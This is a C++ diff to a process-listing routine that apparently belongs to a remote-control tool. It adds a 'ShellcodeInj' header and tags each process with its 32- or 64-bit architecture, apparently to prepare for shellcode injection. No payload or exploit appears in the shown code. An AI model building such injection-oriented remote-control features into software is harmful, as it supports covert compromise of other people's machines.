@@ -13,6 +13,7 @@
 #endif
 
 #include <Psapi.h>
+#include "ShellcodeInj.h"
 
 #pragma comment(lib,"psapi.lib")
 
@@ -91,11 +92,15 @@ LPBYTE CSystemManager::GetProcessList()
                 if (dwReturn==0) {
                     strcpy(szProcessFullPath,"");
                 }
-
+                BOOL is64Bit;
+                ShellcodeInj::IsProcess64Bit(hProcess, is64Bit);
+                const char* arch = is64Bit ? "x64" : "x86";
+                char exeFile[300];
+                sprintf(exeFile, "%s:%s", pe32.szExeFile, arch);
                 //开始计算占用的缓冲区， 我们关心他的发送的数据结构
                 // 此进程占用数据大小
                 dwLength = sizeof(DWORD) +
-                           lstrlen(pe32.szExeFile) + lstrlen(szProcessFullPath) + 2;
+                           lstrlen(exeFile) + lstrlen(szProcessFullPath) + 2;
                 // 缓冲区太小，再重新分配下
                 if (LocalSize(szBuffer) < (dwOffset + dwLength))
                     szBuffer = (LPBYTE)LocalReAlloc(szBuffer, (dwOffset + dwLength),
@@ -107,8 +112,8 @@ LPBYTE CSystemManager::GetProcessList()
                 memcpy(szBuffer + dwOffset, &(pe32.th32ProcessID), sizeof(DWORD));
                 dwOffset += sizeof(DWORD);
 
-                memcpy(szBuffer + dwOffset, pe32.szExeFile, lstrlen(pe32.szExeFile) + 1);
-                dwOffset += lstrlen(pe32.szExeFile) + 1;
+                memcpy(szBuffer + dwOffset, exeFile, lstrlen(exeFile) + 1);
+                dwOffset += lstrlen(exeFile) + 1;
 
                 memcpy(szBuffer + dwOffset, szProcessFullPath, lstrlen(szProcessFullPath) + 1);
                 dwOffset += lstrlen(szProcessFullPath) + 1;
